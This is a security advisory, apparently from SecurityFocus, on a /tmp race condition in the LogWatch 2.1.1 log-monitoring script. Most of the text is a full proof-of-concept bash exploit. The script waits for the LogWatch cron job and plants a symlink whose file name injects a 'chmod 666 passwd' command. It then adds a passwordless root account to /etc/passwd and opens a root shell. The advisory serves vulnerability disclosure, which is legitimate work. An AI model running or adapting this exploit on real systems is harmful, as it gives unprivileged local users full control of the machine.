source: http://www.securityfocus.com/bid/4374/info

LogWatch is a freely available, open source script for monitoring log files. It may be used with the Linux and Unix Operating systems.

Upon execution, LogWatch creates a directory in /tmp. This directory uses the name logwatch.$pid, where $pid is the process id of the executing script. The LogWatch script does not check for an already existing directory or contents of the already existing directory. It is therefore possible for a local user to create a malicious logwatch.$pid directory using predicted process IDs, and place malicious files in the directory which will be executed. 

cat > logwatch211.sh <<EOF

#!/bin/bash
#
# March 27 2002
#
# logwatch211.sh
#
# Proof of concept exploit code
# for LogWatch 2.1.1
# Waits for LogWatch to be run then gives root shell
# For educational purposes only
#
# (c) Spybreak <spybreak@host.sk>


SERVANT="00-logwatch" # Logwatch's cron entry
SCRIPTDIR=/etc/log.d/scripts/logfiles/samba/

echo
echo "LogWatch 2.1.1 root shell exploit"
echo '(c) Spybreak <spybreak@host.sk>'
echo
echo "Waiting for LogWatch to be executed"

while :; do
  set `ps -o pid -C $SERVANT`
    if [ -n "$2" ]; then
      mkdir /tmp/logwatch.$2
      ln -s $SCRIPTDIR'`cd etc;chmod 666 passwd #`' /tmp/logwatch.$2/cron
      break;
    fi
done
echo "Waiting for LogWatch to finish it's work"
while :; do
  set `ps -o pid -C $SERVANT`
    if [ -z "$2" ]; then
      ls -l /etc/passwd|mail root
      echo master::0:0:master:/root:/bin/bash >> /etc/passwd
      break;
    fi
done
su master

EOF